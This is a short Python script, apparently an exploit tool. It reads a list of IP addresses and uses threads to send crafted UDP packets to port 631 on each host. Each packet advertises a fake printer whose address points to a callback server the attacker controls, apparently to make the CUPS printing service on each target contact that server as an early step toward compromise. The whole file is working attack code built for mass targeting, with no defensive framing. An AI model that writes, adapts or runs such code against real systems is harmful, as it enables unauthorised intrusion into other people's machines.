import socket
import sys
import time
import logging
from threading import Thread
from queue import Queue

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_udp_packet(destination_ip, host_callback):
    try:
        resource_uri = f'http://{host_callback}:80/printers/NAME'
        resource_info = 'Printer'
        payload = f"0x00 0x03 {resource_uri} \"{resource_info}\"".encode('utf-8')

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
            logging.info(f"Sending UDP packet to {destination_ip}:631 ...")
            udp_socket.sendto(payload, (destination_ip, 631))
    except Exception as e:
        logging.error(f"Failed to send UDP packet to {destination_ip}: {e}")

def worker(queue, host_callback):
    while not queue.empty():
        ip = queue.get()
        if validate_ip(ip):
            send_udp_packet(ip, host_callback)
        else:
            logging.warning(f"Invalid IP address: {ip}")
        queue.task_done()

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def handle_target_ips(host_callback, file_input):
    try:
        with open(file_input, 'r') as ip_file:
            target_ips = ip_file.read().strip().splitlines()

        queue = Queue()
        for ip in target_ips:
            queue.put(ip)

        threads = []
        for _ in range(min(10, len(target_ips))):
            thread = Thread(target=worker, args=(queue, host_callback))
            thread.start()
            threads.append(thread)

        queue.join()

        for thread in threads:
            thread.join()
    except FileNotFoundError:
        logging.error(f"File not found: {file_input}")
    except Exception as e:
        logging.error(f"An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <HOST_CALLBACK> <FILE_INPUT>")
        sys.exit(1)

    HOST_CALLBACK = sys.argv[1]
    FILE_INPUT = sys.argv[2]
    handle_target_ips(HOST_CALLBACK, FILE_INPUT)
